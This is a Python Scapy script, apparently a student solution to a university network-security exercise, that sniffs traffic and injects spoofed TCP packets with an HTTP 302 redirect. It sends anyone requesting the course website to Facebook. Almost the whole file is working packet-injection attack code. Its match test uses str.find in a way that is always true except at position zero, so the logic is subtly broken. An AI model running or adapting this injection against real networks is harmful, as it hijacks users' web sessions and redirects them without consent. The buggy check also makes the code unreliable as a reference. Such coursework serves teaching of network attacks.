import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: http://www.facebook.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to Facebook by sending them the
    `RESPONSE` from above.
    """
    packet_str = str(packet)
    if packet_str.find(WEBSITE) and packet_str.find("GET"):
        ip = packet.getlayer(S.IP)
        tcp = packet.getlayer(S.TCP)
        ip_pkt = S.IP(dst=ip.src, src=ip.dst)
        tcp_pkt = S.TCP(dport=ip.sport,sport=ip.dport, flags="AF", seq=tcp.ack, ack=tcp.seq+1)
        http_pkt = S.Raw(load=RESPONSE)

        # craft a http repsonse packet (contained in ip and tcp layers)
        response_pkt = ip_pkt / tcp_pkt / http_pkt
        return response_pkt

def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!

    if '--help' in args or len(args) > 1:
        print 'Usage: %s' % args[0]
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
